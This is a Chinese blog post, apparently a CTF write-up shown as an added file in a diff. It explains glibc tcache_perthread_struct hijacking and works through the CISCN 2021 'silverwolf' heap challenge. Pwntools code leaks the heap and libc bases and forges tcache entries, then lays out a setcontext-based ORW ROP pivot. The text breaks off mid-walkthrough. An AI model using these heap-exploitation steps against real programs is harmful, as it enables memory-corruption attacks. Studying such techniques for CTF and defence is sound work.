@@ -1,0 +1,859 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'true');
+  </script>
+
+
+  
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "true");
+  </script>
+
+
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.clipboard_tips = {"success":"我是复制糕手!(*^▽^*)!","fail":"一拳一个不让复制![○･｀Д´･ ○]","copyright":{"enable":true,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};window.REIMU_CONFIG.anchor_icon = 'f2dc';</script>
+  
+  
+  <title>
+    劫持tcache_perthread_struct |
+    
+    Dusk的怪东西
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+    <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="堆劫持tcache_perthread_struct，来伪造堆数，从而控制堆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="劫持tcache_perthread_struct">
+<meta property="og:url" content="https://fallingdusky.github.io/2024/04/27/%E5%8A%AB%E6%8C%81tcache_perthread_struct(Ubuntu22.04%E4%B9%8B%E5%89%8D)/index.html">
+<meta property="og:site_name" content="Dusk的怪东西">
+<meta property="og:description" content="堆劫持tcache_perthread_struct，来伪造堆数，从而控制堆">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240426223034808-716180166.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240426223647653-450186157.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240426223203715-439199098.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427094156647-363504993.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427094510551-425507554.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427094627784-1904648021.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427095153958-1413715253.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427095407635-250612587.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427095559425-1362029456.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427100150305-1222889883.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101023276-762138581.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101049531-529781327.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101927044-850379117.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101945768-1436361933.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427104507741-953595500.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427110149708-436005707.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111123839-2019308764.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111228035-1803931608.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111327154-1705991264.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427111439915-1477585456.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211226346-42078125.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211245943-1568004840.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211328962-903329788.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211348558-1988703103.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211407039-1374223032.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240429211421920-1113325612.png">
+<meta property="article:published_time" content="2024-04-27T03:20:00.000Z">
+<meta property="article:modified_time" content="2024-11-29T13:04:46.748Z">
+<meta property="article:author" content="Dusk">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240426223034808-716180166.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Dusk的怪东西" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">格林...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="劫持tcache_perthread_struct">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">劫持tcache_perthread_struct</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-劫持tcache_perthread_struct(Ubuntu22.04之前)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2024/04/27/%E5%8A%AB%E6%8C%81tcache_perthread_struct(Ubuntu22.04%E4%B9%8B%E5%89%8D)/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-04-27T03:20:00.000Z" itemprop="datePublished">2024-04-27</time>
+    <time style="display: none;" id="post-update-time">2024-11-29</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-aos="zoom-in">网络安全</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <h1 id="前言可忽略"><a class="markdownIt-Anchor" href="#前言可忽略"></a> 前言（可忽略）</h1>
+<p>堆不愧是堆…知识点真的要多用动调查看堆的状态才好理解</p>
+<h1 id="tcache_perthread_struct的结构"><a class="markdownIt-Anchor" href="#tcache_perthread_struct的结构"></a> tcache_perthread_struct的结构</h1>
+<h2 id="源码"><a class="markdownIt-Anchor" href="#源码"></a> 源码</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
+<p>我们可以看到，该结构体有两个数组，一个是<strong>counts</strong>，另一个是<strong>entry</strong></p>
+<h2 id="counts数组"><a class="markdownIt-Anchor" href="#counts数组"></a> counts数组</h2>
+<p>counts的数组记录的是<strong>tcache上各个bin上的堆个数</strong>，如下图<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240426223034808-716180166.png" alt="image" /><br />
+这是bins的情况<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240426223647653-450186157.png" alt="image" /><br />
+这是heap_base的情况，也就是我们的tcache_perthread_struct的状况，被红框框起来的地方就是counts记录个数的区域<br />
+这是我们的攻击点之一<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240426223203715-439199098.png" alt="image" /><br />
+这是struct里的counts个数，可以看到个数是对应的</p>
+<h2 id="entry指针数组"><a class="markdownIt-Anchor" href="#entry指针数组"></a> entry指针数组</h2>
+<p>如题，entry储存的是<strong>各个指针</strong>，存储的是<strong>各个bin链表上的首chunk的fd指针</strong><br />
+而entry就储存在counts之下，这也是我们的另一个攻击点</p>
+<h2 id="大小"><a class="markdownIt-Anchor" href="#大小"></a> 大小</h2>
+<p>一般而言是0x250或者0x290，依旧前0x10是chunk头，记录该结构体的大小</p>
+<h2 id="攻击方法"><a class="markdownIt-Anchor" href="#攻击方法"></a> 攻击方法</h2>
+<p>通过TAF泄露出<strong>heap_base</strong>的地址，heap_base所在的区域就是tcache_perthread_struct，但我们不能修改它的chunk头，否则会破坏结构体。我们攻击的地方是从heap_base + 0x10的地方，这个地方就是我们的data域，首先<strong>伪造counts</strong>，然后就是<strong>修改entry为我们的恶意ROP链</strong>。常见的攻击方式有<strong>setcontext+orw(结不结合SROP因题而异),劫持free_hook</strong></p>
+<h1 id="例题1ciscn-2021-初赛silverwolfsetcontextorw"><a class="markdownIt-Anchor" href="#例题1ciscn-2021-初赛silverwolfsetcontextorw"></a> 例题①[CISCN 2021 初赛]silverwolf（setcontext+orw）</h1>
+<h2 id="checksec"><a class="markdownIt-Anchor" href="#checksec"></a> checksec</h2>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427094156647-363504993.png" alt="image" /><br />
+只能说堆题是这样的</p>
+<h2 id="源审"><a class="markdownIt-Anchor" href="#源审"></a> 源审</h2>
+<h3 id="main"><a class="markdownIt-Anchor" href="#main"></a> main</h3>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427094510551-425507554.png" alt="image" /><br />
+很经典的菜单<br />
+其中sub_C70是初始化和sandbox，仅允许使用orw</p>
+<h3 id="add"><a class="markdownIt-Anchor" href="#add"></a> add</h3>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427094627784-1904648021.png" alt="image" /><br />
+add的重点就是这几个，<strong>index只能为0，size不超过0x78，buf会指向v2</strong></p>
+<h3 id="edit"><a class="markdownIt-Anchor" href="#edit"></a> edit</h3>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427095153958-1413715253.png" alt="image" /><br />
+索引依然是0，v0会指向buf，也就是我们最近申请的malloc，意味着<strong>我们能够修改的堆块只能是我们最近申请的堆块</strong>。后面还藏着个off-by-one漏洞，但是不重要，把以往的send变成sendline就好</p>
+<h3 id="show"><a class="markdownIt-Anchor" href="#show"></a> show</h3>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427095407635-250612587.png" alt="image" /><br />
+标准的show函数，输出索引为0的堆块内容</p>
+<h3 id="delete"><a class="markdownIt-Anchor" href="#delete"></a> delete</h3>
+<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427095559425-1362029456.png" alt="image" /><br />
+free索引为0的堆块，没有置空指针，明显的UAF漏洞</p>
+<h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3>
+<p>因为索引只能为0，意味着我们只能对最近申请的堆块进行操作，大大限制了我们利用UAF的能力，没法用double free，但是我们仍可以malloc到一个我们想要的地址，只需要修改堆块里的fd指针即可，结合sandbox里只允许我们用orw，那么很明显就是通过劫持tcache_perthread_struct来布置恶意ROP链</p>
+<h2 id="动调过程"><a class="markdownIt-Anchor" href="#动调过程"></a> 动调过程</h2>
+<p>我先把各个功能的函数定义出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+<h3 id="泄露heap_base"><a class="markdownIt-Anchor" href="#泄露heap_base"></a> 泄露heap_base</h3>
+<p>先看看初始bins的情况<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427100150305-1222889883.png" alt="image" /><br />
+因为sandbox的存在，初始就会有一些堆块生成<br />
+接下来就是老一套了，UAF泄露出heap_base，都看到这了应该就不用多解释是怎么泄露出来的吧（）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;heap_addr==&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x11b0</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
+<h3 id="泄露libc_base"><a class="markdownIt-Anchor" href="#泄露libc_base"></a> 泄露libc_base</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="comment">#sleep(0.5)</span></span><br><span class="line">    delete()</span><br><span class="line">    edit(p64(<span class="number">0</span>) * <span class="number">2</span>) <span class="comment">#清除fd和bk指针，使其能够持续free下去</span></span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> <span class="comment">#free tcache_perthread_struct into unsorted bins</span></span><br><span class="line">log.success(<span class="string">&#x27;main_arena==&gt;&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook==&gt;&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">edit(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x78</span>) <span class="comment">#恢复结构体</span></span><br></pre></td></tr></table></figure>
+<p>在当初free的基础上，将其fd指针修改为<code>heap_base+0x10</code>，两次add劫持到tcache_perthread_struct里，看看动调过程<br />
+edit之前<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101023276-762138581.png" alt="image" /><br />
+edit之后<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101049531-529781327.png" alt="image" /><br />
+可以看出来已经将其fd指向了tcache_perthread_struct，进行两次malloc即可劫持到里边<br />
+此时我们就可以泄露栈地址了，通过<strong>修改fd和bk指针欺骗系统让其可以持续free</strong>，待其填满0x250所在的bins链表后就可以进入unsorted_bin里<strong>泄露main_arena</strong>，进而泄露malloc_hook和libc_base<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101927044-850379117.png" alt="image" /><br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427101945768-1436361933.png" alt="image" /><br />
+OK现在泄露完两个基质之后就可以构造了</p>
+<h3 id="tcache_bins构造恶意地址"><a class="markdownIt-Anchor" href="#tcache_bins构造恶意地址"></a> tcache_bins构造恶意地址</h3>
+<h4 id="该阶段payload"><a class="markdownIt-Anchor" href="#该阶段payload"></a> 该阶段Payload</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">rax = libc_base + <span class="number">0x43ae8</span></span><br><span class="line">rbp = libc_base + <span class="number">0x21353</span></span><br><span class="line">rdi = libc_base + <span class="number">0x215bf</span></span><br><span class="line">rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">rsi = libc_base + <span class="number">0x23eea</span></span><br><span class="line">rsp = libc_base + <span class="number">0x3960</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#syscall = read + 0xf</span></span><br><span class="line">syscall = libc_base + <span class="number">0xe5965</span> <span class="comment">#注意，只能是syscall;ret，可以在IDA中使用sequence of bytes寻找，编码为 0xf 0x05 0xc3</span></span><br><span class="line">mov_rsp_rdi_a0 = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x1000</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br><span class="line">orw1 = heap_base + <span class="number">0x3000</span></span><br><span class="line">orw2 = heap_base + <span class="number">0x3060</span></span><br><span class="line">fake_orw1 = heap_base + <span class="number">0x2000</span></span><br><span class="line">fake_orw2 = heap_base + <span class="number">0x20a0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x40</span> <span class="comment">#repair the counts,which is 64 byteds</span></span><br><span class="line">payload += p64(free_hook) + p64(<span class="number">0</span>) <span class="comment">#0x20 0x30</span></span><br><span class="line">payload += p64(flag_addr) + p64(fake_orw1) <span class="comment">#0x40 0x50</span></span><br><span class="line">payload += p64(fake_orw2) + p64(orw1) <span class="comment">#0x60 0x70</span></span><br><span class="line">payload += p64(orw2) <span class="comment">#0x80</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(payload)</span><br></pre></td></tr></table></figure>
+<p>在布置恶意地址之前我们先来介绍一个函数<code>setcontext</code>，是我们劫持tcache_perthread_struct的时候相当常用的函数</p>
+<h4 id="setcontext"><a class="markdownIt-Anchor" href="#setcontext"></a> setcontext</h4>
+<p>看看它的源码<br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427104507741-953595500.png" alt="image" /><br />
+框起来的地方就是我们主要利用的地方,<strong>free是rdi寻址，而我们刚好可以利用rdi</strong><br />
+setcontext函数就是通过rdi给各个寄存器赋值，但对我们来说只有rsp最重要，当然仅仅有rsp并不够，还要有rip，好在最后有ret指令，可以把执行地址迁移到我们的恶意ROP链上<br />
+所以我们通常使用的是setcontext+53，另一个原因是<strong>不想引用fldenv指令</strong>，防止造成<strong>程序崩溃</strong></p>
+<h4 id="动调"><a class="markdownIt-Anchor" href="#动调"></a> 动调</h4>
+<p>OK现在该回到动调过程了<br />
+<strong>先修改counts数组，尔后修改entry为我们布置的地址</strong><br />
+<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240427110149708-436005707.png" alt="image" /><br />
+由于我们<strong>没有办法直接修改链表的内容</strong>所以我们需要在两个orw地址上再伪造两个地址，一个用来引用free，另一个用来跳转到orw上，我会一一给出解释</p>
